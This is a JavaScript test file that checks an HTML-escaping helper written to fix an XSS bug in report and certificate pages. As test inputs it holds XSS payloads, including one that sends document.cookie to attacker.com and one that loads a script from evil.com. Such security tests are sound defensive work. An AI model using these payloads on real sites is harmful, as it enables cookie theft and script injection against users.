/**
 * Tests for HTML escaping utility.
 *
 * These tests act as regression tests for the XSS vulnerability found in
 * reports.routes.ts and certificates.service.ts where user-supplied data
 * (project names, organization names, item descriptions) was interpolated
 * directly into HTML template strings served with Content-Type: text/html.
 *
 * See: docs/PLAN-DE-TESTING.md — Fase 1, tests de seguridad.
 */
import { describe, it, expect } from 'vitest';
import { escapeHtml } from './html-escape';

describe('escapeHtml', () => {
  it('escapes < and > to prevent tag injection', () => {
    expect(escapeHtml('<script>')).toBe('&lt;script&gt;');
    expect(escapeHtml('</script>')).toBe('&lt;/script&gt;');
  });

  it('escapes & to prevent entity injection', () => {
    expect(escapeHtml('AT&T')).toBe('AT&amp;T');
  });

  it('escapes double quotes to prevent attribute breakout', () => {
    expect(escapeHtml('"value"')).toBe('&quot;value&quot;');
  });

  it('escapes single quotes to prevent attribute breakout', () => {
    expect(escapeHtml("it's")).toBe('it&#x27;s');
  });

  it('passes through safe text unchanged', () => {
    expect(escapeHtml('Constructora Patagonia S.A.')).toBe('Constructora Patagonia S.A.');
    expect(escapeHtml('Red Cloacal 2024')).toBe('Red Cloacal 2024');
    expect(escapeHtml('123.456,78')).toBe('123.456,78');
  });

  it('returns empty string for empty input', () => {
    expect(escapeHtml('')).toBe('');
  });

  it('handles a full XSS payload used in project names', () => {
    const payload = '<img src=x onerror="fetch(\'https://attacker.com/?c=\'+document.cookie)">';
    const result = escapeHtml(payload);
    // The tag itself must be escaped — no executable <img> remains
    expect(result).not.toContain('<img');
    expect(result).toContain('&lt;img');
    // The > that would close the tag must also be escaped
    expect(result).not.toMatch(/<[^&]/);
  });

  it('handles script tag injection attempt', () => {
    const payload = '<script>alert("XSS")</script>';
    const result = escapeHtml(payload);
    expect(result).not.toContain('<script>');
    expect(result).toContain('&lt;script&gt;');
  });

  it('handles SVG-based XSS payload', () => {
    const payload = '<svg onload="alert(1)">';
    const result = escapeHtml(payload);
    expect(result).not.toContain('<svg');
    expect(result).toContain('&lt;svg');
  });

  it('handles attribute breakout in organization name', () => {
    const payload = '"><script src="https://evil.com/x.js"></script><"';
    const result = escapeHtml(payload);
    expect(result).not.toContain('<script');
    expect(result).not.toContain('">');
  });
});
